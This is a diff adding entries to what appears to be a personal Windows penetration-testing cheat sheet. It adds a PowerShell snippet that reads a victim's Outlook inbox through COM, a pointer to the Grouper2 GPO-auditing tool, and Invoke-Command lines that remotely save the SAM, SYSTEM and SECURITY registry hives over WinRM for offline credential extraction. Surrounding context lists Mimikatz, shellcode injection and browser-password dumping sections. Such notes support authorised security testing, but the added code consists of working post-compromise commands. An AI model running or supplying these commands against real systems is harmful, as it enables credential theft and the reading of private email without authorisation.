@@ -61,6 +61,7 @@ A place for me to store my notes/tricks for Windows Based Systems.
       * <a href="#-exchange-mailbox-post-compromise">Exchange Mailbox Post-Compromise</a>
       * <a href="#-crackmapexec">CrackMapExec</a>
       * <a href="#-mail-sniper">Mail Sniper</a>
+      * <a href="#-read-exchange-emails-with-powershell">Read Exchange Emails with PowerShell</a>
       * <a href="#-kerberos-stuff">Kerberos Stuff</a>
       * <a href="#-mssql-exploiting-powerupsql">MSSQL Exploiting (PowerUpSQL)</a>
       * <a href="#-malicious-macro-with-msbuild">Malicious Macro with MSBuild</a>
@@ -70,6 +71,7 @@ A place for me to store my notes/tricks for Windows Based Systems.
       * <a href="#-invoke-psimage">Invoke-PSImage</a>
       * <a href="#-meterpreter--donut---shellcode-injection-net">Meterpreter + Donut - Shellcode Injection .NET</a>
       * <a href="#">DemiGuise - Encrypted HTA</a>
+      * <a href="#-grouper2">Grouper2 - Find Vuln GPO's</a>
    * <a href="#privilege-escalation">Privilege Escalation</a>
       * <a href="#-basics-1">Basics</a>
       * <a href="#-powerupps1-sometimes-a-quick-win">PowerUp.ps1 (Sometimes a Quick Win)</a>
@@ -107,6 +109,7 @@ A place for me to store my notes/tricks for Windows Based Systems.
       * <a href="#-run-seatbelt-absolutely-must">Run Seatbelt (ABSOLUTELY MUST)</a>
       * <a href="#-dump-creds">Dump Creds</a>
       * <a href="#-dump-creds-2">Dump Creds #2</a>
+      * <a href="#-dump-creds-2">Dump SAM Remotely over WinRM</a>
       * <a href="#-running-mimikatz-with-gadgettojscript-or-vbs">Running MimiKatz with JScript or VBS</a>
       * <a href="#-sessiongopher">SessionGohper</a>
       * <a href="#-dump-chrome-passwords-also-post-exploit-1">Dump Chrome Passwords (Also Post Exploit)</a>
@@ -889,6 +892,20 @@ Lmao, you really think Id use the pass Summer2019?
 
 
 
+#### [](#header-4) Read Exchange Emails with PowerShell
+
+```powershell
+$outlook = New-Object -ComObject outlook.application
+$olFolders ="Microsoft.Office.Interop.Outlook.OlDefaultFolders" -as [type]
+$namespace = $Outlook.GetNameSpace("MAPI")
+$inbox = $namespace.GetDefaultFolder($olFolders::olFolderInbox)
+$inbox.items.count
+$inbox.items
+$inbox.items.GetLast()
+```
+
+
+
 #### [](#header-4) Kerberos Stuff
 
 ```powershell
@@ -1067,6 +1084,20 @@ run
 Run the demiguise.py file, giving it your encryption-key, payload-type, output file-name and command that you want the HTA run.
 
 Example: python demiguise.py -k hello -c "notepad.exe" -p Outlook.Application -o
+
+```
+
+
+
+#### [](#header-4) Grouper2
+
+```powershell
+#https://github.com/l0ss/Grouper2
+
+Find vulnerabilities in AD Group Policy
+
+Grouper2 is a tool for pentesters to help find security-related misconfigurations in Active Directory Group Policy.
+
 
 ```
 
@@ -1666,6 +1697,20 @@ laZagne.exe browsers -firefox
 
 ```
 
+
+
+#### [](#header-4) Dump SAM Remotely with WinRM
+
+```powershell
+
+Invoke-Command -ComputerName m0chan -Credential $cred -ScriptBlock {reg save hklm\sam c:\temp\sam.save}
+
+Invoke-Command -ComputerName m0chan -Credential $cred -ScriptBlock {reg save hklm\system c:\temp\system.save}
+
+Invoke-Command -ComputerName m0chan -Credential $cred -ScriptBlock {reg save hklm\security c:\temp\security.save}
+
+
+```
 
 
 #### [](#header-4) Running Mimikatz with GadgetToJScript or VBS
